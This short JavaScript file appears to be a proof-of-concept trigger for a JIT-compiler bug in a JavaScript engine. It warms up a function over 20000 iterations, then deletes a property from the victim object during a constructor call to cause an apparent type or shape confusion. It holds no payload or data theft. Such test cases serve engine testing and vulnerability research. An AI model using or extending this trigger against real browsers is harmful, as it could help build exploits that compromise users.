let trigger_poc = false;
let o_victim;
class C4 {
    constructor() {
        if (trigger_poc) {
            delete o_victim.p0;
        }
    }
}
function func_to_jit(a8) {
    o_victim = a8;
    const v9 = new C4();
    a8.p1 = v9;
}
for (let i11 = 0; i11 < 20000; i11++) {
    let obj = { p0: 1 };
    func_to_jit(obj);
}
trigger_poc = true;
let trigger_obj = { p0: 1 };
func_to_jit(trigger_obj);
